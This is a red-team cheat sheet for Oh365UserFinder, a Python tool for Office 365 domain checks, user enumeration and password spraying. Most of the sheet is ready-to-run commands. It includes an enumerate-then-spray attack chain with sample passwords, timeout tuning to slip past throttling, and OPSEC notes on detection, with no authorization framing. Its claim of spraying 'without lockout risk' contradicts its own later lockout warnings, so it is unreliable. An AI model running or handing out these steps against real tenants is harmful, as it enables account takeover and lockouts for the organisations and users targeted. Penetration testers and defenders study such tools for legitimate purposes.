# Oh365UserFinder

**Type:** Python Script
**Purpose:** O365 user enumeration and password spraying without lockout risk
**Platform:** Windows, Linux, macOS
**Tags:** #o365 #enumeration #password-spray #user-enum #python #domain-validation

---

## Installation & Setup

```bash
# Clone repository
git clone https://github.com/dievus/oh365userfinder.git
cd oh365userfinder

# Install dependencies
pip3 install -r requirements.txt

# Run
python3 oh365userfinder.py -h
```

---

## Quick Reference

```bash
# Validate domain
python3 oh365userfinder.py -d company.com

# Validate single email
python3 oh365userfinder.py -e user@company.com

# Validate email list
python3 oh365userfinder.py -r emails.txt -w valid.txt

# Password spray
python3 oh365userfinder.py -p 'Password123!' --pwspray --elist valid-users.txt
```

---

## RECON: Domain Validation

```bash
# Check if domain uses O365
python3 oh365userfinder.py -d company.com
python3 oh365userfinder.py -d company.onmicrosoft.com

# Quick check before enumeration
```

---

## ENUM: User Enumeration

```bash
# Single user
python3 oh365userfinder.py -e john.doe@company.com

# From file
python3 oh365userfinder.py -r usernames.txt

# Save valid users to file
python3 oh365userfinder.py -r users.txt -w valid-users.txt

# Save to CSV
python3 oh365userfinder.py -r users.txt -c valid-users.csv

# With timeout (avoid throttling)
python3 oh365userfinder.py -r users.txt -w valid.txt -t 30

# Verbose output
python3 oh365userfinder.py -r users.txt -w valid.txt --verbose
```

**How It Works:**
- Parses "IfExistsResult" flag in response
- Valid user: IfExistsResult is not null
- Invalid user: IfExistsResult is null
- Detects and handles throttling automatically

---

## CRED: Password Spraying

```bash
# Basic password spray
python3 oh365userfinder.py -p 'Summer2024!' --pwspray --elist valid-users.txt

# With timeout
python3 oh365userfinder.py -p 'Password123!' --pwspray --elist users.txt -t 60

# Tool identifies MFA when reporting valid accounts
# WARNING: Account lockouts possible with wrong passwords
```

---

## Attack Patterns

### Pattern: Domain Check → Enum → Spray
```bash
# 1. Validate domain
python3 oh365userfinder.py -d company.com

# 2. Enumerate users
python3 oh365userfinder.py -r potential-users.txt -w valid-users.txt -t 30

# 3. Password spray valid users
python3 oh365userfinder.py -p 'SeasonYear!' --pwspray --elist valid-users.txt -t 60
```

---

## Throttling & Timeouts

```bash
# Default: No timeout (fast but may trigger throttling)
python3 oh365userfinder.py -r users.txt -w valid.txt

# 30 second timeout
python3 oh365userfinder.py -r users.txt -w valid.txt -t 30

# 60 second timeout (very slow but safe)
python3 oh365userfinder.py -r users.txt -w valid.txt -t 60

# Tool auto-detects throttling and may pause
# Increase timeout if false positives occur
```

---

## Pro Tips

💡 **Throttling Aware**: Auto-detects and handles Microsoft throttling
💡 **No Lockout Risk**: Enumeration doesn't trigger lockouts
💡 **IfExistsResult**: Uses response flag for accurate validation
💡 **MFA Detection**: Reports MFA status during password spray
💡 **Timeout Tuning**: Increase `-t` if false positives appear
💡 **CSV Output**: Use `-c` for spreadsheet analysis
💡 **Verbose Mode**: Use `--verbose` for troubleshooting

---

## OPSEC Considerations

✅ **Enumeration**: Low risk, no authentication attempts
⚠️ **Password Spray**: Medium-high risk, can cause lockouts
**Detection**: Logged in Azure AD (especially password spray)

---

## Resources

- GitHub: https://github.com/dievus/oh365userfinder
- Author: @dievus
- Based on: o365Creeper (Korey McKinley)
